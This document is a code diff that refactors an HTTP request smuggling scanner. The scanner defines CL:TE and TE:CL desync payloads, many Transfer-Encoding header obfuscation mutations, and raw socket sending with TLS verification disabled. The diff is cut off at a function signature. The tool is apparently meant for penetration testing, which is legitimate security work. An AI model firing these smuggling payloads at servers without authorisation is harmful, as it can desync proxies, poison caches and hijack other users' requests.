@@ -1,17 +1,11 @@
-######## https://github.com/gwen001/pentest-tools/blob/master/smuggler.py
-##
-##
-##
-
 #!/usr/bin/python3
+"""
+HTTP Request Smuggling Detection Tool ..beta..
+Based on research by James Kettle (@albinowax)
+https://portswigger.net/web-security/request-smuggling
 
-# I don't believe in license.
-# You can do whatever you want with this program.
-
-# Based on the awesome James Kettle research
-# https://twitter.com/albinowax
-# https://portswigger.net/web-security/request-smuggling
-# https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
+Original: https://github.com/gwen001/pentest-tools/blob/master/smuggler.py
+"""
 
 import os
 import sys
@@ -20,815 +14,615 @@ import time
 import random
 import argparse
 import socket
-import requests
 from urllib.parse import urlparse
 from threading import Thread
 from queue import Queue
-from colored import fg, bg, attr
 
-MAX_EXCEPTION = 10
-MAX_VULNERABLE = 3
-
-# disable "InsecureRequestWarning: Unverified HTTPS request is being made."
+import requests
+from colored import fg, attr
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 
-def banner():
-	print("""
-                                         _
-         ___ _ __ ___  _   _  __ _  __ _| | ___ _ __       _ __  _   _
-        / __| '_ ` _ \| | | |/ _` |/ _` | |/ _ \ '__|     | '_ \| | | |
-        \__ \ | | | | | |_| | (_| | (_| | |  __/ |     _  | |_) | |_| |
-        |___/_| |_| |_|\__,_|\__, |\__, |_|\___|_|    (_) | .__/ \__, |
-                             |___/ |___/                  |_|    |___/
+# ---------------------------------------------------------------------------
+# Constants
+# ---------------------------------------------------------------------------
 
-                        by @gwendallecoguic
+CRLF = "\r\n"
+MAX_EXCEPTION = 10
+MAX_VULNERABLE = 3
 
-""")
-	pass
-
-banner()
-
-
-CRLF = '\r\n'
-
-t_base_headers = {
-    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/60.0',
-    'Accept': '*/*',
-    'Accept-Language': 'en-US,en;q=0.5',
-    # 'Accept-Encoding': 'gzip, deflate',
-    'Content-Type': 'application/x-www-form-urlencoded',
-    'Connection': 'close',
-    'Content-Length': '0',
+DEFAULT_HEADERS = {
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/60.0",
+    "Accept": "*/*",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Connection": "close",
+    "Content-Length": "0",
 }
 
-t_colors = {
-    'ref': 'cyan',
-    'attack': 'white',
-    'vulnerable': 'light_red',
+COLORS = {
+    "ref": "cyan",
+    "attack": "white",
+    "vulnerable": "light_red",
 }
 
-t_attacks_datas = [
-    {'name':'CL:TE1', 'Content-Length':5, 'body':'1\r\nZ\r\nQ\r\n\r\n'},
-    {'name':'CL:TE2', 'Content-Length':11, 'body':'1\r\nZ\r\nQ\r\n\r\n'},
-    {'name':'TE:CL1', 'Content-Length':5, 'body':'0\r\n\r\n'},
-    {'name':'TE:CL2', 'Content-Length':6, 'body':'0\r\n\r\nX'},
+ATTACK_PAYLOADS = [
+    {"name": "CL:TE1", "Content-Length": 5,  "body": "1\r\nZ\r\nQ\r\n\r\n"},
+    {"name": "CL:TE2", "Content-Length": 11, "body": "1\r\nZ\r\nQ\r\n\r\n"},
+    {"name": "TE:CL1", "Content-Length": 5,  "body": "0\r\n\r\n"},
+    {"name": "TE:CL2", "Content-Length": 6,  "body": "0\r\n\r\nX"},
 ]
 
-t_registered_method = [
-    # 'tabprefix1',
-    # 'vertprefix1',
-
-    'vanilla',
-    'dualchunk',
-    'badwrap',
-    'space1',
-    'badsetupLF',
-    'gareth1',
-
-    # niche techniques
-    # 'underjoin1',
-    'spacejoin1',
-    #'underscore2',
-    # 'space2',
-    'nameprefix1',
-    'valueprefix1',
-    'nospace1',
-    'commaCow',
-    'cowComma',
-    'contentEnc',
-    'linewrapped1',
-    'quoted',
-    'aposed',
-    'badsetupCR',
-    'vertwrap',
-    'tabwrap',
-
-    # new techniques for BHEU
-    # 'chunky',
-
-    # new techniques for AppSec
-    'lazygrep',
-    'multiCase',
-    'zdwrap',
-    'zdspam',
-    'revdualchunk',
-    'nested',
-    # 'bodysplit',
-    # 'zdsuffix',
-    # 'tabsuffix',
-    # 'UPPERCASE',
-    # 'reversevanilla',
-    # 'spaceFF',
-    # 'accentTE',
-    # 'accentCH',
-    # 'unispace',
-    # 'connection',
-
-    'spacefix1_0',
-    'spacefix1_9',
-    'spacefix1_11',
-    'spacefix1_12',
-    'spacefix1_13',
-    'spacefix1_127',
-    'spacefix1_160',
-    'spacefix1_255',
-
-    'prefix1_0',
-    'prefix1_9',
-    'prefix1_11',
-    'prefix1_12',
-    'prefix1_13',
-    'prefix1_127',
-    'prefix1_160',
-    'prefix1_255',
-
-    'suffix1_0',
-    'suffix1_9',
-    'suffix1_11',
-    'suffix1_12',
-    'suffix1_13',
-    'suffix1_127',
-    'suffix1_160',
-    'suffix1_255',
+# All registered obfuscation methods to test
+REGISTERED_METHODS = [
+    "vanilla",
+    "dualchunk",
+    "badwrap",
+    "space1",
+    "badsetupLF",
+    "gareth1",
+    "spacejoin1",
+    "nameprefix1",
+    "valueprefix1",
+    "nospace1",
+    "commaCow",
+    "cowComma",
+    "contentEnc",
+    "linewrapped1",
+    "quoted",
+    "aposed",
+    "badsetupCR",
+    "vertwrap",
+    "tabwrap",
+    "lazygrep",
+    "multiCase",
+    "zdwrap",
+    "zdspam",
+    "revdualchunk",
+    "nested",
+    # Character-based space substitutions
+    "spacefix1_0",   "spacefix1_9",   "spacefix1_11",  "spacefix1_12",
+    "spacefix1_13",  "spacefix1_127", "spacefix1_160", "spacefix1_255",
+    # Character-based value prefixes
+    "prefix1_0",   "prefix1_9",   "prefix1_11",  "prefix1_12",
+    "prefix1_13",  "prefix1_127", "prefix1_160", "prefix1_255",
+    # Character-based value suffixes
+    "suffix1_0",   "suffix1_9",   "suffix1_11",  "suffix1_12",
+    "suffix1_13",  "suffix1_127", "suffix1_160", "suffix1_255",
 ]
-# t_registered_method = [
-#     'contentEnc',
-# ]
-
-class attackMethod:
-    def update_content_length( self, msg, cl ):
-        return msg.replace( 'Content-Length: 0', 'Content-Length: '+str(cl) )
-
-    def underjoin1( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding', 'Transfer_Encoding' )
-        return msg
-
-    def underscore2( self, msg ):
-        msg = msg.replace( 'Content-Length', 'Content_Length' )
-        return msg
-
-    def spacejoin1( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding', 'Transfer Encoding' )
-        return msg
-
-    def space1( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding', 'Transfer-Encoding ' )
-        return msg
-
-    def space2( self, msg ):
-        msg = msg.replace( 'Content-Length', 'Content-Length ' )
-        return msg
-
-    def nameprefix1( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding', ' Transfer-Encoding' )
-        return msg
-
-    def valueprefix1( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:  ' )
-        return msg
-
-    def nospace1( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:' )
-        return msg
-
-    def tabprefix1( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:\t' )
-        return msg
-
-    def vertprefix1( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:\u000B' )
-        return msg
-
-    def commaCow( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked, identity' )
-        return msg
-
-    def cowComma( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: identity, ' )
-        return msg
-
-    def contentEnc( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Content-Encoding: ' )
-        return msg
-
-    def linewrapped1( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:\n' )
-        return msg
-
-    def gareth1( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding\n : ' )
-        return msg
-
-    def quoted( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: "chunked"' )
-        return msg
-
-    def aposed( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', "Transfer-Encoding: 'chunked'" )
-        return msg
-
-    def badwrap( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Foo: bar' )
-        msg = msg.replace( 'HTTP/1.1\r\n', 'HTTP/1.1\r\n Transfer-Encoding: chunked\r\n' )
-        return msg
-
-    def badsetupCR( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Foo: bar' )
-        msg = msg.replace( 'HTTP/1.1\r\n', 'HTTP/1.1\r\nFooz: bar\rTransfer-Encoding: chunked\r\n' )
-        return msg
-
-    def badsetupLF( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Foo: bar' )
-        msg = msg.replace( 'HTTP/1.1\r\n', 'HTTP/1.1\r\nFooz: bar\nTransfer-Encoding: chunked\r\n' )
-        return msg
-
-    def vertwrap( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: \n\u000B' )
-        return msg
-
-    def tabwrap( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: \n\t' )
-        return msg
-
-    def dualchunk( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked\r\nTransfer-Encoding: identity' )
-        return msg
-
-    def lazygrep( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunk' )
-        return msg
-
-    def multiCase( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'TrAnSFer-EnCODinG: cHuNkeD' )
-        return msg
-
-    def UPPERCASE( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'TRANSFER-ENCODING: CHUNKED' )
-        return msg
-
-    def zdwrap( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Foo: bar' )
-        msg = msg.replace( 'HTTP/1.1\r\n', 'HTTP/1.1\r\nFoo: bar\r\n\rTransfer-Encoding: chunked\r\n' )
-        return msg
-
-    def zdsuffix( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked\r' )
-        return msg
-
-    def zdsuffix( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked\t' )
-        return msg
-
-    def revdualchunk( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: identity\r\nTransfer-Encoding: chunked' )
-        return msg
-
-    def zdspam( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer\r-Encoding: chunked' )
-        return msg
-
-    def bodysplit( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Foo: barn\n\nTransfer-Encoding: chunked' )
-        return msg
-
-    def connection( self, msg ):
-        msg = msg.replace( 'Connection', 'Transfer-Encoding' )
-        return msg
-
-    def nested( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: cow chunked bar' )
-        return msg
-
-    def spaceFF( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(255) )
-        return msg
-
-    def unispace( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(160) )
-        return msg
-
-    def accentTE( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding:', 'Transf'+chr(130)+'r-Encoding:' )
-        return msg
-
-    def accentCH( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfr-Encoding: ch'+chr(150)+'nked' )
-        return msg
-
-    # concept by @webtonull
-    def chunky( self, msg ):
-        pad_str = ''
-        pad_chunk = "F\r\nAAAAAAAAAAAAAAA\r\n"
-        for i in range(0,3000):
-            pad_str = pad_str + pad_chunk
-        msg = msg.replace( 'Transfer-Encoding: chunked\r\n\r\n', 'Transfer-Encoding: chunked\r\n\r\n'+pad_str )
-        if 'Content-Length: 11' in msg:
-            msg = msg.replace( 'Content-Length: ', 'Content-Length: 600' )
-        else:
-            msg = msg.replace( 'Content-Length: ', 'Content-Length: 6000' )
-        return msg
-
-    def vanilla( self, msg ):
-        # ???
-        return msg
-
-    def reversevanilla( self, msg ):
-        # ???
-        return msg
-
-    def spacefix1_0( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(0) )
-        return msg
-    def spacefix1_9( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(9) )
-        return msg
-    def spacefix1_11( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(11) )
-        return msg
-    def spacefix1_12( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(12) )
-        return msg
-    def spacefix1_13( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(13) )
-        return msg
-    def spacefix1_127( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(127) )
-        return msg
-    def spacefix1_160( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(160) )
-        return msg
-    def spacefix1_255( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(255) )
-        return msg
-
-    def prefix1_0( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: '+chr(0) )
-        return msg
-    def prefix1_9( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: '+chr(9) )
-        return msg
-    def prefix1_11( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: '+chr(11) )
-        return msg
-    def prefix1_12( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: '+chr(12) )
-        return msg
-    def prefix1_13( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: '+chr(13) )
-        return msg
-    def prefix1_127( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: '+chr(127) )
-        return msg
-    def prefix1_160( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: '+chr(160) )
-        return msg
-    def prefix1_255( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: '+chr(255) )
-        return msg
-
-    def suffix1_0( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked'+chr(0) )
-        return msg
-    def suffix1_9( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked'+chr(9) )
-        return msg
-    def suffix1_11( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked'+chr(11) )
-        return msg
-    def suffix1_12( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked'+chr(12) )
-        return msg
-    def suffix1_13( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked'+chr(13) )
-        return msg
-    def suffix1_127( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked'+chr(127) )
-        return msg
-    def suffix1_160( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked'+chr(160) )
-        return msg
-    def suffix1_255( self, msg ):
-        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked'+chr(255) )
-        return msg
 
 
-class sockRequest:
-    url = ''
-    message = ''
-    response = ''
-    length = 0
-    time = 0
-    headers = ''
-    headers_length = 0
-    t_headers = {}
-    status_code = -1
-    status_reason = ''
-    content = ''
-    content_length = 0
+# ---------------------------------------------------------------------------
+# Attack Method Mutations
+# ---------------------------------------------------------------------------
+
+class AttackMethod:
+    """
+    Each method mutates a raw HTTP request string to apply a specific
+    Transfer-Encoding obfuscation technique.
+    """
+
+    def update_content_length(self, msg: str, cl: int) -> str:
+        return msg.replace("Content-Length: 0", f"Content-Length: {cl}")
+
+    # --- Header name/value spacing mutations ---
+
+    def vanilla(self, msg: str) -> str:
+        return msg
+
+    def space1(self, msg: str) -> str:
+        return msg.replace("Transfer-Encoding", "Transfer-Encoding ")
+
+    def nameprefix1(self, msg: str) -> str:
+        return msg.replace("Transfer-Encoding", " Transfer-Encoding")
+
+    def valueprefix1(self, msg: str) -> str:
+        return msg.replace("Transfer-Encoding: ", "Transfer-Encoding:  ")
+
+    def nospace1(self, msg: str) -> str:
+        return msg.replace("Transfer-Encoding: ", "Transfer-Encoding:")
+
+    def spacejoin1(self, msg: str) -> str:
+        return msg.replace("Transfer-Encoding", "Transfer Encoding")
+
+    # --- Header value mutations ---
+
+    def commaCow(self, msg: str) -> str:
+        return msg.replace(
+            "Transfer-Encoding: chunked",
+            "Transfer-Encoding: chunked, identity",
+        )
+
+    def cowComma(self, msg: str) -> str:
+        return msg.replace("Transfer-Encoding: ", "Transfer-Encoding: identity, ")
+
+    def contentEnc(self, msg: str) -> str:
+        return msg.replace("Transfer-Encoding: ", "Content-Encoding: ")
+
+    def quoted(self, msg: str) -> str:
+        return msg.replace(
+            "Transfer-Encoding: chunked", 'Transfer-Encoding: "chunked"'
+        )
+
+    def aposed(self, msg: str) -> str:
+        return msg.replace(
+            "Transfer-Encoding: chunked", "Transfer-Encoding: 'chunked'"
+        )
+
+    def lazygrep(self, msg: str) -> str:
+        return msg.replace("Transfer-Encoding: chunked", "Transfer-Encoding: chunk")
+
+    def multiCase(self, msg: str) -> str:
+        return msg.replace(
+            "Transfer-Encoding: chunked", "TrAnSFer-EnCODinG: cHuNkeD"
+        )
+
+    def nested(self, msg: str) -> str:
+        return msg.replace(
+            "Transfer-Encoding: chunked", "Transfer-Encoding: cow chunked bar"
+        )
+
+    def zdspam(self, msg: str) -> str:
+        return msg.replace(
+            "Transfer-Encoding: chunked", "Transfer\r-Encoding: chunked"
+        )
+
+    # --- Dual / reversed chunk headers ---
+
+    def dualchunk(self, msg: str) -> str:
+        return msg.replace(
+            "Transfer-Encoding: chunked",
+            "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
+        )
+
+    def revdualchunk(self, msg: str) -> str:
+        return msg.replace(
+            "Transfer-Encoding: chunked",
+            "Transfer-Encoding: identity\r\nTransfer-Encoding: chunked",
+        )
+
+    # --- Header line-wrapping / folding mutations ---
+
+    def linewrapped1(self, msg: str) -> str:
+        return msg.replace("Transfer-Encoding: ", "Transfer-Encoding:\n")
+
+    def gareth1(self, msg: str) -> str:
+        return msg.replace("Transfer-Encoding: ", "Transfer-Encoding\n : ")
+
+    def vertwrap(self, msg: str) -> str:
+        return msg.replace("Transfer-Encoding: ", "Transfer-Encoding: \n\u000B")
+
+    def tabwrap(self, msg: str) -> str:
+        return msg.replace("Transfer-Encoding: ", "Transfer-Encoding: \n\t")
+
+    # --- Header injection via request-line suffix ---
+
+    def badwrap(self, msg: str) -> str:
+        msg = msg.replace("Transfer-Encoding: chunked", "Foo: bar")
+        msg = msg.replace(
+            "HTTP/1.1\r\n",
+            "HTTP/1.1\r\n Transfer-Encoding: chunked\r\n",
+        )
+        return msg
+
+    def badsetupCR(self, msg: str) -> str:
+        msg = msg.replace("Transfer-Encoding: chunked", "Foo: bar")
+        msg = msg.replace(
+            "HTTP/1.1\r\n",
+            "HTTP/1.1\r\nFooz: bar\rTransfer-Encoding: chunked\r\n",
+        )
+        return msg
+
+    def badsetupLF(self, msg: str) -> str:
+        msg = msg.replace("Transfer-Encoding: chunked", "Foo: bar")
+        msg = msg.replace(
+            "HTTP/1.1\r\n",
+            "HTTP/1.1\r\nFooz: bar\nTransfer-Encoding: chunked\r\n",
+        )
+        return msg
+
+    def zdwrap(self, msg: str) -> str:
+        msg = msg.replace("Transfer-Encoding: chunked", "Foo: bar")
+        msg = msg.replace(
+            "HTTP/1.1\r\n",
+            "HTTP/1.1\r\nFoo: bar\r\n\rTransfer-Encoding: chunked\r\n",
+        )
+        return msg
+
+    # --- Character substitution: space between colon and value ---
+
+    def spacefix1_0(self, msg):   return msg.replace("Transfer-Encoding: ", "Transfer-Encoding:" + chr(0))
+    def spacefix1_9(self, msg):   return msg.replace("Transfer-Encoding: ", "Transfer-Encoding:" + chr(9))
+    def spacefix1_11(self, msg):  return msg.replace("Transfer-Encoding: ", "Transfer-Encoding:" + chr(11))
+    def spacefix1_12(self, msg):  return msg.replace("Transfer-Encoding: ", "Transfer-Encoding:" + chr(12))
+    def spacefix1_13(self, msg):  return msg.replace("Transfer-Encoding: ", "Transfer-Encoding:" + chr(13))
+    def spacefix1_127(self, msg): return msg.replace("Transfer-Encoding: ", "Transfer-Encoding:" + chr(127))
+    def spacefix1_160(self, msg): return msg.replace("Transfer-Encoding: ", "Transfer-Encoding:" + chr(160))
+    def spacefix1_255(self, msg): return msg.replace("Transfer-Encoding: ", "Transfer-Encoding:" + chr(255))
+
+    # --- Character substitution: prefix before "chunked" ---
+
+    def prefix1_0(self, msg):   return msg.replace("Transfer-Encoding: ", "Transfer-Encoding: " + chr(0))
+    def prefix1_9(self, msg):   return msg.replace("Transfer-Encoding: ", "Transfer-Encoding: " + chr(9))
+    def prefix1_11(self, msg):  return msg.replace("Transfer-Encoding: ", "Transfer-Encoding: " + chr(11))
+    def prefix1_12(self, msg):  return msg.replace("Transfer-Encoding: ", "Transfer-Encoding: " + chr(12))
+    def prefix1_13(self, msg):  return msg.replace("Transfer-Encoding: ", "Transfer-Encoding: " + chr(13))
+    def prefix1_127(self, msg): return msg.replace("Transfer-Encoding: ", "Transfer-Encoding: " + chr(127))
+    def prefix1_160(self, msg): return msg.replace("Transfer-Encoding: ", "Transfer-Encoding: " + chr(160))
+    def prefix1_255(self, msg): return msg.replace("Transfer-Encoding: ", "Transfer-Encoding: " + chr(255))
+
+    # --- Character substitution: suffix after "chunked" ---
+
+    def suffix1_0(self, msg):   return msg.replace("Transfer-Encoding: chunked", "Transfer-Encoding: chunked" + chr(0))
+    def suffix1_9(self, msg):   return msg.replace("Transfer-Encoding: chunked", "Transfer-Encoding: chunked" + chr(9))
+    def suffix1_11(self, msg):  return msg.replace("Transfer-Encoding: chunked", "Transfer-Encoding: chunked" + chr(11))
+    def suffix1_12(self, msg):  return msg.replace("Transfer-Encoding: chunked", "Transfer-Encoding: chunked" + chr(12))
+    def suffix1_13(self, msg):  return msg.replace("Transfer-Encoding: chunked", "Transfer-Encoding: chunked" + chr(13))
+    def suffix1_127(self, msg): return msg.replace("Transfer-Encoding: chunked", "Transfer-Encoding: chunked" + chr(127))
+    def suffix1_160(self, msg): return msg.replace("Transfer-Encoding: chunked", "Transfer-Encoding: chunked" + chr(160))
+    def suffix1_255(self, msg): return msg.replace("Transfer-Encoding: chunked", "Transfer-Encoding: chunked" + chr(255))
 
 
-    def __init__( self, url, message ):
+# ---------------------------------------------------------------------------
+# Raw Socket Request
+# ---------------------------------------------------------------------------
+
+class SockRequest:
+    """Sends a raw HTTP request over a socket and parses the response."""
+
+    def __init__(self, url: str, message: str):
         self.url = url
         self.message = message
+        self.response = ""
+        self.length = 0
+        self.time = 0
+        self.headers = ""
+        self.headers_length = 0
+        self.t_headers: dict = {}
+        self.status_code = -1
+        self.status_reason = ""
+        self.content = ""
+        self.content_length = 0
 
-
-    def receive_all( self, sock ):
-        datas = ''
-
-        for i in range(100):
-            chunk = sock.recv( 4096 )
+    def _receive_all(self, sock) -> str:
+        for _ in range(100):
+            chunk = sock.recv(4096)
             if chunk:
-                datas = datas + chunk.decode(errors='ignore')
-                break # yes yes I know...
-                # but we don't really care about the content, it's mostly about the delay so...
-            else:
-                break
+                return chunk.decode(errors="ignore")
+        return ""
 
-        return datas
-
-
-    def extractDatas( self ):
+    def _parse_response(self):
         try:
-            self.length = len( self.response )
-            p = self.response.find( CRLF+CRLF )
-            self.headers = self.response[0:p]
-            self.headers_length = len( self.headers )
-            self.content = self.response[p+len(CRLF+CRLF):]
-            self.content_length = len( self.content )
+            self.length = len(self.response)
+            split_pos = self.response.find(CRLF + CRLF)
+            self.headers = self.response[:split_pos]
+            self.headers_length = len(self.headers)
+            self.content = self.response[split_pos + len(CRLF + CRLF):]
+            self.content_length = len(self.content)
 
-            tmp = self.headers.split( CRLF )
+            header_lines = self.headers.split(CRLF)
+            status_parts = header_lines[0].split(" ")
+            self.status_code = int(status_parts[1])
+            self.status_reason = status_parts[2]
 
-            first_line = tmp[0].split( ' ' )
-            self.status_code = int(first_line[1])
-            self.status_reason = first_line[2]
-
-            for header in tmp:
-                p = header.find( ': ' )
-                k = header[0:p]
-                v = header[p+2:]
-                self.t_headers[ k ] = v
+            for line in header_lines[1:]:
+                if ": " in line:
+                    k, _, v = line.partition(": ")
+                    self.t_headers[k] = v
         except Exception as e:
-            sys.stdout.write( "%s[-] extractDatas - error occurred: %s%s\n" % (fg('red'),e,attr(0)) )
+            _err(f"_parse_response error: {e}")
 
+    def send(self) -> bool:
+        parsed = urlparse(self.url)
 
-    def send( self ):
-        t_urlparse = urlparse( self.url )
-
-        if t_urlparse.port:
-            port = t_urlparse.port
-        elif t_urlparse.scheme == 'https':
-            port = 443
+        # Determine host and port
+        if ":" in parsed.netloc:
+            netloc, port_str = parsed.netloc.rsplit(":", 1)
+            port = int(port_str)
         else:
-            port = 80
+            netloc = parsed.netloc
+            port = 443 if parsed.scheme == "https" else 80
 
-        # not supposed to happen but thanks to AlessandroZ
-        # https://github.com/gwen001/pentest-tools/pull/3
-        if ':' in t_urlparse.netloc:
-            tmp = t_urlparse.netloc.split(':')
-            netloc = tmp[0]
-            port = tmp[1]
-        else:
-            netloc = t_urlparse.netloc
+        if parsed.port:
+            port = parsed.port
 
-        # print( t_urlparse )
-        # print( self.url )
-        # print( port )
-        # print( '>>>'+self.message+'<<<' )
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-        sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
+        if parsed.scheme == "https":
+            ctx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
+            ctx.verify_mode = ssl.CERT_NONE
+            sock = ctx.wrap_socket(sock, server_hostname=netloc)
 
-        if t_urlparse.scheme == 'https':
-            context = ssl.SSLContext( ssl.PROTOCOL_SSLv23 )
-            context.verify_mode = ssl.CERT_NONE
-            sock = context.wrap_socket( sock, server_hostname=netloc )
-
-        sock.settimeout( _timeout )
+        sock.settimeout(config["timeout"])
 
         try:
-            sock.connect( (netloc, int(port)) )
+            sock.connect((netloc, port))
         except Exception as e:
-            sys.stdout.write( "%s[-] send (connect) - error occurred: %s (%s)%s\n" % (fg('red'),e,self.url,attr(0)) )
+            _err(f"send (connect) error: {e} ({self.url})")
             return False
 
-        sock.sendall( str.encode(self.message) )
+        sock.sendall(self.message.encode())
         start = time.time()
 
         try:
-            datas = self.receive_all( sock )
+            self.response = self._receive_all(sock)
         except Exception as e:
-            sys.stdout.write( "%s[-] send (receive) - error occurred: %s (%s)%s\n" % (fg('red'),e,self.url,attr(0)) )
+            _err(f"send (receive) error: {e} ({self.url})")
             return False
 
-        end = time.time()
+        self.time = (time.time() - start) * 1000
 
         try:
-            sock.shutdown( socket.SHUT_RDWR )
+            sock.shutdown(socket.SHUT_RDWR)
         except Exception as e:
-            sys.stdout.write( "%s[-] send (shutdown) - error occurred: %s (%s)%s\n" % (fg('red'),e,self.url,attr(0)) )
+            _err(f"send (shutdown) error: {e} ({self.url})")
             return False
 
         sock.close()
 
-        self.response = datas
-        self.time = (end - start) * 1000
+        if self.response:
+            self._parse_response()
 
-        if len(datas):
-            self.extractDatas()
+        return True
 
 
-def generateAttackMessage( base_message, method, attack_datas ):
-    try:
-        f = getattr( am, method )
-    except Exception as e:
-        return ''
+# ---------------------------------------------------------------------------
+# Message Generation
+# ---------------------------------------------------------------------------
+
+def build_base_message(url: str, headers: dict) -> str:
+    """Builds a base POST request string for the given URL."""
+    parsed = urlparse(url)
+    path = parsed.path or "/"
+    if parsed.query:
+        path += "?" + parsed.query
+    if parsed.fragment:
+        path += "#" + parsed.fragment
+
+    msg = f"POST {path} HTTP/1.1{CRLF}"
+    msg += f"Host: {parsed.netloc}{CRLF}"
+    for k, v in headers.items():
+        msg += f"{k}: {v}{CRLF}"
+    msg += CRLF
+    return msg
+
+
+def build_attack_message(
+    base_message: str, method: str, payload: dict, am: AttackMethod
+) -> str:
+    """Applies an obfuscation method and payload to a base request."""
+    mutate = getattr(am, method, None)
+    if mutate is None:
+        return ""
 
     msg = base_message.strip() + CRLF
-    msg = am.update_content_length( msg, attack_datas['Content-Length'] )
-    msg = msg + 'Transfer-Encoding: chunked' + CRLF
-    msg = msg + CRLF + attack_datas['body']
-
-    # apply methods variation
-    msg = f( msg )
-
-    return msg
+    msg = am.update_content_length(msg, payload["Content-Length"])
+    msg += "Transfer-Encoding: chunked" + CRLF
+    msg += CRLF + payload["body"]
+    return mutate(msg)
 
 
-def generateBaseMessage( url, t_evil_headers ):
-    t_urlparse = urlparse( url )
-    # print( t_urlparse )
+# ---------------------------------------------------------------------------
+# Output Helpers
+# ---------------------------------------------------------------------------
 
-    if t_urlparse.path:
-        query = t_urlparse.path
+def _err(msg: str):
+    sys.stdout.write(f"{fg('red')}[-] {msg}{attr(0)}\n")
+
+
+def print_result(r: SockRequest, r_type: str, method: str, payload: dict):
